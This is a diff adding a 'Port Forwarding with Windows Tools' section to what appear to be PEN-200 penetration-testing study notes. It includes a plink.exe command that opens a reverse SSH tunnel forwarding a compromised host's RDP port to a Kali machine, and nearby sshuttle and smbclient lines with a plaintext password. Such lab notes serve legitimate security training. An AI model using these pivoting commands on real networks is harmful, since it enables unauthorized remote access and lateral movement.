@@ -71,6 +71,7 @@
 * [Port Redirection and SSH Tunneling](#Port-Redirection-and-SSH-Tunneling)
   * [Port Forwarding with Linux Tools](#Port-Forwarding-with-Linux-Tools)
   * [SSH Tunneling](#SSH-Tunneling)
+  * [Port Forwarding with Windows Tools](#Port-Forwarding-with-Windows-Tools)
 
 # Useful
 
@@ -1648,5 +1649,40 @@ kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.5
 
 # smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
 ~~~
+
+
+
+## Port Forwarding with Windows Tools
+
+### ssh.exe
+
+#### Finding ssh.exe
+
+~~~ bash
+C:\Users\rdp_admin>where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+
+C:\Users\rdp_admin>
+~~~
+
+#### Resources
+
+- [ssh_exe_exercise_client](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/294665d279db5d8f79695e7d9dfc0986-ssh_exe_exercise_client)
+- [ssh_exe_exercise_client_aarch64](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/extras/prat2/d5a2ba960124f3cf5089951b99445af5-ssh_exe_exercise_client_aarch64)
+
+
+
+### Plink
+
+#### Making an SSH connection
+
+~~~ bash
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+~~~
+
+#### Download plink.exe
+
+[https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe](https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe)
+
 
 
